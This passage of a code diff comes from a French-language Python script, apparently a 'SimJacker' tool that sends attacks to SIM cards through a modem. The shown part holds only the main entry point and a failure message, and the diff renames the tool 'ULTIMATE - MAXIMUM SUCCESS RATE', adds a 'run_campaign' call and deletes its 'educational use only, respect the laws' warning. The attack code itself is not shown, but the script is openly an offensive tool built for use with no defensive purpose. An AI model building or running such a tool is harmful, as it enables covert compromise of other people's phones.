+            print("\n💡 Pistes:")
+            print("   • La carte SIM n'est pas vulnérable")
+            print("   • Les tags sont incorrects")
+            print("   • Le modem n'est pas bien configuré")
+        
+        self.modem.running = False
+        return True
 
 # =====================================================================
-# POINT D'ENTRÉE PRINCIPAL
+# MAIN
 # =====================================================================
-if __name__ == "__main__":
+def main():
     print("\n" + "="*70)
-    print("🚀 SIMJACKER MVP - SYSTÈME")
+    print("🔥 SIMJACKER ULTIMATE - MAXIMUM SUCCESS RATE")
     print("="*70)
-    print("⚠️  USAGE ÉDUCATIF UNIQUEMENT - RESPECTE LES LOIS")
+    print("\n⚠️  CE SCRIPT N'OFFRE AUCUNE GARANTIE")
+    print("   Il teste TOUTES les possibilités pour MAXIMISER les chances")
+    print("   Mais le succès dépend UNIQUEMENT de la vulnérabilité de la carte SIM")
     print("="*70)
     
-    # Vérifier les dépendances
-    try:
-        import serial
-        import flask
-    except ImportError as e:
-        print(f"\n❌ Dépendance manquante: {e}")
-        print("Installation automatique...")
-        os.system("pip install pyserial flask requests --break-system-packages")
-        print("✅ Réessaie maintenant")
-        sys.exit(0)
+    app = SimJackerUltimate()
     
-    # Lancer le programme
-    app = SimJackerExpert()
     try:
-        app.run()
+        app.run_campaign()
     except KeyboardInterrupt:
-        print("\n\n👋 Arrêt d'urgence")
+        print("\n\n👋 Arrêt utilisateur")
     except Exception as e:
-        print(f"\n❌ Erreur fatale: {e}")
+        print(f"\n❌ Erreur: {e}")
         import traceback
         traceback.print_exc()
+
+if __name__ == "__main__":
+    main()
